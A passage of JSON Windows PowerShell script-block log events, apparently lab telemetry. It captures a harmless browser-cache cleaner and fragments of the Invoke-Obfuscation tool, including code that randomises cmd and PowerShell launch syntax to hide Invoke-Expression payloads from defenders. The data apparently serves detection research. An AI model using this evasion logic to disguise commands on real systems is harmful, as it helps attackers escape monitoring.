}\r\n         }\r\n}\r\nFunction Clear_Mozilla ($a) {\t\r\n    Import-CSV -Path $a -Header Name | ForEach-Object {\r\n        Try {\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n\t        Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache2\\entries\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\thumbnails\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\webappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\chromeappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            }\r\n        Catch {\r\n            Write-Host -ForegroundColor Red \"   Firefox\"\r\n            }\r\n            \r\n        }\r\n}\r\n\r\n# Google Chrome\r\nFunction Clear_Chrome_OutFile ($a) {\r\n\t#   log-\r\n\tTry {\r\n\t\tOut-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\r\n\t\tOut-File -FilePath $PathLog -InputObject $TitleChrome -Append -Encoding Unicode\r\n\t\tOut-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\r\n\t\t}\r\n\tCatch {\r\n        Write-Host -ForegroundColor Red \"   log-\"\r\n        }\r\n\t\r\n\t\r\n    Import-CSV -Path $a -Header Name | ForEach-Object {\r\n\t\tTry {\r\n\t\t\tRemove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache2\\entries\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Media Cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies-Journal\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\ChromeDWriteFontCache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4&gt;&amp;1 | Out-File $PathLog -Append -Encoding Unicode\r\n\t\t\t}\r\n\t\tCatch {\r\n\t\t\tWrite-Host -ForegroundColor Red \"   Chrome\"\r\n\t\t\t}\r\n            \r\n        }\r\n}\r\nFunction Clear_Chrome ($a) {\t\r\n    Import-CSV -Path $a -Header Name | ForEach-Object {\r\n\t\tTry {\r\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\r\n            Remove-Item -Path \"C\r\n\r\nScriptBlock ID: efeae38c-61bc-441a-801d-dedbe9eabd03\r\nPath: C:\\Users\\vagrant\\posh\\Broom.ps1</Message><Level>Verbose</Level><Task>Execute a Remote Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event>",
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell"
            },
            "winlog": {
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "4",
                    "ScriptBlockText": "<#PSScriptInfo\n\n.VERSION 0.25\n\n.GUID 1b158786-70ac-433f-b3f3-87b9e1baac75\n\n.AUTHOR An.St.\n\n.COPYRIGHT  Starinin Andrey (AnSt), 2017\n\n.LICENSE MIT License\n\n.LICENSEURI https://github.com/anst-foto/Broom/blob/master/LICENSE\n\n.PROJECTURI https://github.com/anst-foto/Broom\n\n.RELEASENOTES\n\nv0.25:\t   (Try/Catch/Finally)\nv0.24:\t    :     \nv0.23:\t    (-    EXE-)\nv0.22:\t  \nv0.21:\t     (Broom_Module.psm1)\nv0.20:\t  alias cmdlet\nv0.19:\t  \nv0.18:\t    \nv0.17:    EXE- PS2EXE-GUI v0.5.0.6 by Ingo Karstein, reworked and GUI support by Markus Scholtes\nv0.16:   PSScriptInfo\nv0.15:\t    \nv0.14:\t   \nv0.13:\t ,  \nv0.12:\t    (MIT License)\nv0.11:\t    \nv0.10:\t   \nv0.9:\t     \nv0.8:\t    \nv0.7:\t  ., Opera\nv0.6:\t   \nv0.5:\t \nv0.4:\t    \nv0.3:\t  \nv0.2:\t   \nv0.1:\t \n\n#>\n\n<#\n.DESCRIPTION \n    ,    \n#> \n\nClear-Host\n\nWrite-Host -ForegroundColor Yellow \"*******************************************************\"\n\"\"\nWrite-Host -ForegroundColor Yellow \"Broom ()\"\nWrite-Host -ForegroundColor Yellow \"   ,   \"\nWrite-Host -ForegroundColor Yellow \"(c) Starinin Andrey (AnSt). 2017\"\nWrite-Host -ForegroundColor Yellow \"MIT License\"\nWrite-Host -ForegroundColor Yellow \": 0.25 ( 2018)\"\n\"\"\nWrite-Host -ForegroundColor Gray \"GitHub - https://github.com/anst-foto/Broom\"\nWrite-Host -ForegroundColor Gray \"Gallery TechNet - https://gallery.technet.microsoft.com/PowerShell-f24f32cb\"\nWrite-Host -ForegroundColor Gray \"PowerShellGallery - https://www.powershellgallery.com/packages/Broom\"\n\"\"\nWrite-Host -ForegroundColor Gray \"***\"\nWrite-Host -ForegroundColor Gray \"   - https://github.com/lemtek/Powershell\"\nWrite-Host -ForegroundColor Gray \"By Lee Bhogal, Paradise Computing Ltd - June 2014\"\nWrite-Host -ForegroundColor Gray \"***\"\n\"\"\nWrite-Host -ForegroundColor Gray \"***\"\nWrite-Host -ForegroundColor Gray \"PS2EXE-GUI - https://gallery.technet.microsoft.com/scriptcenter/PS2EXE-GUI-Convert-e7cb69d5\"\nWrite-Host -ForegroundColor Gray \"License: MS-LPL\"\nWrite-Host -ForegroundColor Gray \"\"\nWrite-Host -ForegroundColor Gray \"PS2EXE-GUI v0.5.0.6 by Ingo Karstein, reworked and GUI support by Markus Scholtes\n\nOverworking of the great script of Igor Karstein with GUI support by Markus Scholtes. \nThe GUI output and input is activated with one switch, real windows executables are generated.\"\nWrite-Host -ForegroundColor Gray \"***\"\n\"\"\nWrite-Host -ForegroundColor Yellow \"*******************************************************\"\n\"\"\n\nWrite-Host -ForegroundColor Gray \"*******************************************************\"\n\"\"\nWrite-Host -ForegroundColor Gray \"MIT License\n\nCopyright (c) 2017 Starinin Andrey\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the `'Software`'), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED `'AS IS`', WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\"\n\"\"\nWrite-Host -ForegroundColor Gray \"*******************************************************\"\n\"\"\n\nWrite-Host -ForegroundColor Green \":\nv0.25:\t   (Try/Catch/Finally)\nv0.24:\t    :     \nv0.23:\t    (-    EXE-)\nv0.22:\t  \nv0.21:\t     (Broom_Module.psm1)\nv0.20:\t  alias cmdlet\nv0.19:\t  \nv0.18:\t    \nv0.17:    EXE- PS2EXE-GUI v0.5.0.6 by Ingo Karstein, reworked and GUI support by Markus Scholtes\nv0.16:   PSScriptInfo\nv0.15:\t    \nv0.14:\t   \nv0.13:\t ,  \nv0.12:\t    (MIT License)\nv0.11:\t    \nv0.10:\t   \nv0.9:\t     \nv0.8:\t    \nv0.7:\t  ., Opera\nv0.6:\t   \nv0.5:\t \nv0.4:\t    \nv0.3:\t  \nv0.2:\t   \nv0.1:\t \"\n\"\"\nWrite-Host -ForegroundColor Yellow \"*******************************************************\"\n\"\"\n#*******************************************************\n\n\n\n#*******************************************************\n\n# OutFile\nFunction OutFile {\n\t$PathLog = \"C:\\users\\$env:USERNAME\\broom.log\"\n\t$DateLog = Get-Date -Format \"dd MMMM yyyy HH:mm:ss\"\n\t$Head1Log = \"------------------------------\"\n\t$Head2Log = \"---------------\"\n\t$Head3Log = \"-------\"\n\t$Title1 = \"   \"\n\t$Title2 = \"       (RecycleBin & Temp)\"\n\t$Title3 = \"         (RecycleBin & Temp)\"\n\t$TitleMozilla = \"Mozilla\"\n\t$TitleChrome = \"Chrome\"\n\t$TitleChromium = \"Chromium\"\n\t$TitleYandex = \"Yandex\"\n\t$TitleOpera = \"Opera\"\n\t$TitleIE = \"Internet Explorer\"\n\t$TitleRecileBinTemp = \"RecileBin & Temp\"\n\n\t\"\"\n    Try {\n\t    New-Item -Path $PathLog -ItemType File -ErrorAction SilentlyContinue -Verbose\n        }\n    Catch {\n        Write-Host -ForegroundColor Red \" / log-\"\n        }\n    Try {\n\t    Out-File -FilePath $PathLog -InputObject $Head1Log -Append -Encoding Unicode\n\t    Out-File -FilePath $PathLog -InputObject $DateLog -Append -Encoding Unicode\n\t    Out-File -FilePath $PathLog -InputObject $Head1Log -Append -Encoding Unicode\n        }\n    Catch {\n        Write-Host -ForegroundColor Red \"   log-\"\n        }\n}\n\n# Mozilla Firefox\nFunction Clear_Mozilla_OutFile ($a) {\n\t#   log-\n    Try {\n        Out-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\n\t    Out-File -FilePath $PathLog -InputObject $TitleMozilla -Append -Encoding Unicode\n\t    Out-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\n        } \n    Catch {\n        Write-Host -ForegroundColor Red \"   log-\"\n        }\n\t\n\t\n    Import-CSV -Path $a -Header Name | ForEach-Object {\n        Try{\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n\t        Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache2\\entries\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\thumbnails\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\webappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\chromeappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n            }\n        Catch {\n            Write-Host -ForegroundColor Red \"   Firefox\"\n            }\n         }\n}\nFunction Clear_Mozilla ($a) {\t\n    Import-CSV -Path $a -Header Name | ForEach-Object {\n        Try {\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\n\t        Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cache2\\entries\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\thumbnails\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\webappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\*.default\\chromeappsstore.sqlite\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\n            }\n        Catch {\n            Write-Host -ForegroundColor Red \"   Firefox\"\n            }\n            \n        }\n}\n\n# Google Chrome\nFunction Clear_Chrome_OutFile ($a) {\n\t#   log-\n\tTry {\n\t\tOut-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\n\t\tOut-File -FilePath $PathLog -InputObject $TitleChrome -Append -Encoding Unicode\n\t\tOut-File -FilePath $PathLog -InputObject $Head3Log -Append -Encoding Unicode\n\t\t}\n\tCatch {\n        Write-Host -ForegroundColor Red \"   log-\"\n        }\n\t\n\t\n    Import-CSV -Path $a -Header Name | ForEach-Object {\n\t\tTry {\n\t\t\tRemove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache2\\entries\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Media Cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies-Journal\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\ChromeDWriteFontCache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose 4>&1 | Out-File $PathLog -Append -Encoding Unicode\n\t\t\t}\n\t\tCatch {\n\t\t\tWrite-Host -ForegroundColor Red \"   Chrome\"\n\t\t\t}\n            \n        }\n}\nFunction Clear_Chrome ($a) {\t\n    Import-CSV -Path $a -Header Name | ForEach-Object {\n\t\tTry {\n            Remove-Item -Path \"C:\\Users\\$($_.Name)\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\*\" -Recurse -Force -ErrorAction SilentlyContinue -Verbose\n            Remove-Item -Path \"C",
                    "ScriptBlockId": "efeae38c-61bc-441a-801d-dedbe9eabd03"
                }
            }
        },
        {
            "@timestamp": "2025-04-03T21:18:43.640Z",
            "event": {
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell"
            },
            "winlog": {
                "event_data": {
                    "MessageNumber": "24",
                    "MessageTotal": "24",
                    "ScriptBlockText": "I of the script to get the AbstractSyntaxTree of.\n\n    .OUTPUTS\n\n    System.Management.Automation.Language.Ast\n\n    .EXAMPLE\n\n    Get-Ast \"Write-Host example\"\n\n    .EXAMPLE\n\n    Get-Ast {Write-Host example}\n\n    .EXAMPLE\n\n    Get-Ast -ScriptPath Write-Example.ps1\n\n    .EXAMPLE\n\n    Get-ChildItem /path/to/scripts -Recurse -Include *.ps1 | Get-Ast\n\n    .EXAMPLE\n\n    @('Write-Host example1', 'Write-Host example2', 'Write-Host example3') | Get-Ast\n\n    .EXAMPLE\n\n    @({ Write-Host example1 }, { Write-Host example2 }, { Write-Host example3 }) | Get-Ast\n\n    .NOTES\n\n    Get-Ast is a part of Invoke-Obfuscation. Invoke-Obfuscation can be found at https://github.com/danielbohannon/Invoke-Obfuscation.\n\n    #>\n    [CmdletBinding(DefaultParameterSetName = \"ByString\")] Param(\n        [Parameter(ParameterSetName = \"ByString\", Position = 0, ValueFromPipeline, Mandatory)]\n        [ValidateNotNullOrEmpty()]\n        [String] $ScriptString,\n\n        [Parameter(ParameterSetName = \"ByScriptBlock\", Position = 0, ValueFromPipeline, Mandatory)]\n        [ValidateNotNullOrEmpty()]\n        [ScriptBlock] $ScriptBlock,\n\n        [Parameter(ParameterSetName = \"ByPath\", Position = 0, ValueFromPipelineByPropertyName, Mandatory)]\n        [ValidateScript({Test-Path $_ -PathType leaf})]\n        [Alias('PSPath')]\n        [String] $ScriptPath,\n\n        [Parameter(ParameterSetName = \"ByUri\", Position = 0, ValueFromPipeline, ValueFromPipelineByPropertyName, Mandatory)]\n        [ValidateScript({$_.Scheme -match 'http|https'})]\n        [Uri] $ScriptUri\n    )\n    Process {\n        If ($ScriptBlock) { $ScriptString = $ScriptBlock -as [String] }\n        ElseIf ($ScriptPath) { $ScriptString = Get-Content -Path $ScriptPath -Raw }\n        ElseIf ($ScriptUri) { $ScriptString = [Net.Webclient]::new().DownloadString($ScriptUri) }\n\n        # Parse script and return root Ast\n        [Management.Automation.Language.ParseError[]] $ParseErrors = @()\n        $Ast = [Management.Automation.Language.Parser]::ParseInput($ScriptString, $null, [ref] $null, [ref] $ParseErrors)\n        $Ast\n    }\n}",
                    "ScriptBlockId": "6c9187c3-53a5-48c4-bf18-663fb8685ac4"
                }
            }
        },
        {
            "@timestamp": "2025-04-03T21:12:30.588Z",
            "event": {
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell"
            },
            "winlog": {
                "event_data": {
                    "MessageNumber": "4",
                    "MessageTotal": "7",
                    "ScriptBlockText": "PowerShell syntax.\n              $CharsForVarName = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')\n              $VariableName  = (Get-Random -Input $CharsForVarName -Count ($CharsForVarName.Count/(Get-Random -Input @(5..10)))) -Join ''\n              $VariableName  = ([Char[]]$VariableName.ToLower() | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $VariableName2 = (Get-Random -Input $CharsForVarName -Count ($CharsForVarName.Count/(Get-Random -Input @(5..10)))) -Join ''\n              $VariableName2 = ([Char[]]$VariableName2.ToLower() | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n\n              # Generate random case syntax for setting the above random variable names.\n              $SetSyntax  = ([Char[]]'set' | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $SetSyntax  = $SetSyntax + ' '*(Get-Random -Minimum 2 -Maximum 4) + $VariableName + '='\n              $SetSyntax2 = ([Char[]]'set' | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $SetSyntax2 = $SetSyntax2 + ' '*(Get-Random -Minimum 2 -Maximum 4) + $VariableName2 + '='\n\n              # Randomize the case of the following variables.\n              $SetSyntax     = ([Char[]]$SetSyntax.ToLower()     | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $SetSyntax2    = ([Char[]]$SetSyntax2.ToLower()    | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $VariableName  = ([Char[]]$VariableName.ToLower()  | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $VariableName2 = ([Char[]]$VariableName2.ToLower() | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n    \n              # Generate random syntax for invoking process-level environment variable syntax.\n              $InvokeOption = Out-RandomInvokeRandomEnvironmentVariableSyntax $VariableName\n\n              # Add additional escaping for vertical pipe (and other characters defined below) if necessary since this is going inside an environment variable for the final $CmdLineOutput set below.\n              ForEach($Char in @('<','>','|','&'))\n              {\n                  If($InvokeOption.Contains(\"^$Char\"))\n                  {\n                      $InvokeOption = $InvokeOption.Replace(\"^$Char\",\"^^^$Char\")\n                  }\n              }\n\n              # Build out command line syntax in reverse so we can display the process argument tree at the end of this Switch block.\n              $PSCmdSyntax = $PowerShellFlags + ' '*(Get-Random -Minimum 1 -Maximum 3) + $InvokeOption\n              $CmdSyntax2  = $SlashC + ' '*(Get-Random -Minimum 0 -Maximum 2) + \"%$VariableName2%\"\n              $CmdSyntax   = $SlashC + ' '*(Get-Random -Minimum 0 -Maximum 4) + '\"' + $SetSyntax + $ScriptString + '&&' + $SetSyntax2 + $PathToPowerShell + $PSCmdSyntax + '&&' + ' '*(Get-Random -Minimum 0 -Maximum 4) + $PathToCmd + $CmdSyntax2 + '\"'\n    \n              # Set argument info for process tree output after this Switch block.\n              $ArgsDefenderWillSee += , @($PathToCmd       , $CmdSyntax)\n              $ArgsDefenderWillSee += , @($PathToCmd       , $CmdSyntax2)\n              $ArgsDefenderWillSee += , @($PathToPowerShell, $PSCmdSyntax.Replace('^',''))\n\n              $CmdLineOutput = $PathToCmd + $CmdSyntax\n          }\n        9 {\n              #############\n              ## STDIN++ ##\n              #############\n              \n              # Switch cmd.exe escape with powershell.exe escape of double-quote.\n              If($ScriptString.Contains('\\\"')) {$ScriptString = $ScriptString.Replace('\\\"','\"')}\n              \n              # Choose random syntax for invoking command stored in process-level environment variable.\n              # Generate random variable names to store the $ScriptString command and PowerShell syntax.\n              $CharsForVarName = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')\n              $VariableName  = (Get-Random -Input $CharsForVarName -Count ($CharsForVarName.Count/(Get-Random -Input @(5..10)))) -Join ''\n              $VariableName  = ([Char[]]$VariableName.ToLower() | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $VariableName2 = (Get-Random -Input $CharsForVarName -Count ($CharsForVarName.Count/(Get-Random -Input @(5..10)))) -Join ''\n              $VariableName2 = ([Char[]]$VariableName2.ToLower() | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n\n              # Generate random case syntax for setting the above random variable names.\n              $SetSyntax  = ([Char[]]'set' | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $SetSyntax  = $SetSyntax + ' '*(Get-Random -Minimum 2 -Maximum 4) + $VariableName + '='\n              $SetSyntax2 = ([Char[]]'set' | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $SetSyntax2 = $SetSyntax2 + ' '*(Get-Random -Minimum 2 -Maximum 4) + $VariableName2 + '='\n\n              # Generate numerous ways to invoke with $ExecutionContext as a variable, including Get-Variable varname, Get-ChildItem Variable:varname, Get-Item Variable:varname, etc.\n              $ExecContextVariable  = @()\n              $ExecContextVariable += '(' + (Get-Random -Input @('DIR','Get-ChildItem','GCI','ChildItem','LS','Get-Item','GI','Item')) + ' ' + 'variable:' + (Get-Random -Input @('Ex*xt','E*t','*xec*t','*ecu*t','*cut*t','*cuti*t','*uti*t','E*ext','E*xt','E*Cont*','E*onte*','E*tex*','ExecutionContext')) + ').Value'\n              # Select random option from above.\n              $ExecContextVariable = Get-Random -Input $ExecContextVariable\n\n              # Generate numerous ways to invoke command stored in environment variable.\n              $GetRandomVariableSyntax  = @()\n              $GetRandomVariableSyntax += '(' + (Get-Random -Input @('DIR','Get-ChildItem','GCI','ChildItem','LS','Get-Item','GI','Item')) + ' ' + 'env:' + $VariableName + ').Value'\n              $GetRandomVariableSyntax += ('(' + '[Environment]::GetEnvironmentVariable(' + \"'$VariableName'\" + ',' + \"'Process'\" + ')' + ')')\n              # Select random option from above.\n              $GetRandomVariableSyntax = Get-Random -Input $GetRandomVariableSyntax\n\n              # Generate random Invoke-Expression/IEX/$ExecutionContext syntax.\n              $InvokeOptions  = @()\n              $InvokeOptions += (Get-Random -Input ('IEX','Invoke-Expression')) + ' '*(Get-Random -Minimum 1 -Maximum 3) + $GetRandomVariableSyntax\n              $InvokeOptions += (Get-Random -Input @('$ExecutionContext','${ExecutionContext}',$ExecContextVariable)) + '.InvokeCommand.InvokeScript(' + ' '*(Get-Random -Minimum 0 -Maximum 3) + $GetRandomVariableSyntax + ' '*(Get-Random -Minimum 0 -Maximum 3) + ')'\n              # Select random option from above.\n              $InvokeOption = Get-Random -Input $InvokeOptions\n\n              # Randomize the case of the following variables.\n              $SetSyntax            = ([Char[]]$SetSyntax.ToLower()            | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $SetSyntax2           = ([Char[]]$SetSyntax2.ToLower()           | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $VariableName         = ([Char[]]$VariableName.ToLower()         | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $VariableName2        = ([Char[]]$VariableName2.ToLower()        | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $InvokeOption         = ([Char[]]$InvokeOption.ToLower()         | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $ExecContextVariable  = ([Char[]]$ExecContextVariable.ToLower()  | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n              $GetRandomVariableSyntax = ([Char[]]$GetRandomVariableSyntax.ToLower() | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''\n\n              # Generate random syntax for invoking process-level environment variable syntax.\n              $InvokeVariableSyntax = Out-RandomInvokeRandomEnvironmentVariableSyntax $VariableName\n\n              # Choose random syntax for invoking powershell.exe's StdIn.\n              $PowerShellStdin = Out-RandomPowerShellStdInInvokeSyntax\n              \n              # Undo some escaping from beginning of function.\n              ForEach($Char in $CharsToEscape)\n              {\n                  If($ScriptString.Contains(\"^^^$Char\")) {$ScriptString = $ScriptString.Replace(\"^^^$Char\",\"^$Char\")}\n    \n                  If($PowerShellStdin.Contains(\"^$Char\")) {$PowerShellStdin = $PowerShellStdin.Replace(\"^$Char\",\"^^^$Char\")}\n              }\n              If($ScriptString.Contains('^^^^'))\n              {\n                  $ScriptString = $ScriptString.Replace('^^^^','^^')\n              }\n\n              # Build out command line syntax in reverse so we can display the process argument tree at the end of this Switch block.\n              $PSCmdSyntax = $PowerShellFlags + ' '*(Get-Random -Minimum 1 -Maximum 3) + $PowerShellStdin + ' '*(Get-Random -Minimum 0 -Maximum 3)\n              $CmdSyntax2  = $SlashC + ' '*(Get-Random -Minimum 0 -Maximum 2) + 